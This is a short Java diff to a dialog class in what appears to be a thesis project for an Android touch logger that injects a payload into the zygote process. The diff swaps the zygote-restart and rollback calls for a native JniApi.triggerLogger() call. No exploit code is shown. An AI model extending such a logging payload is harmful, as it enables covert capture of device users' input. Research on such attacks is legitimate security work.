@@ -6,8 +6,8 @@ import android.content.DialogInterface;
 import android.os.Handler;
 
 import org.leyfer.thesis.touchlogger_dirty.R;
-import org.leyfer.thesis.touchlogger_dirty.activation.PayloadActivator;
 import org.leyfer.thesis.touchlogger_dirty.handler.InjectProgressHandler;
+import org.leyfer.thesis.touchlogger_dirty.utils.JniApi;
 
 /**
  * Created by kirill on 19.03.17.
@@ -25,20 +25,12 @@ public class RestartZygoteAlertDialog extends AlertDialog {
                 new Thread(new Runnable() {
                     @Override
                     public void run() {
-                        if (PayloadActivator.getInstance().restartZygote()) {
-                            handler.sendEmptyMessage(InjectProgressHandler.MSG_ZYGOTE_RESTART_SUCCESS);
-                        } else {
-                            handler.sendEmptyMessage(InjectProgressHandler.MSG_ZYGOTE_RESTART_FAIL);
-                        }
+                        JniApi.triggerLogger();
+                        handler.sendEmptyMessage(InjectProgressHandler.TRIGGER_SUCCESS);
                     }
                 }).start();
             }
         });
-        setButton(BUTTON_NEGATIVE, context.getResources().getString(R.string.rollback), new OnClickListener() {
-            @Override
-            public void onClick(DialogInterface dialog, int which) {
-                PayloadActivator.getInstance().rollbackPatches();
-            }
-        });
+        //TODO: cancel button
     }
 }
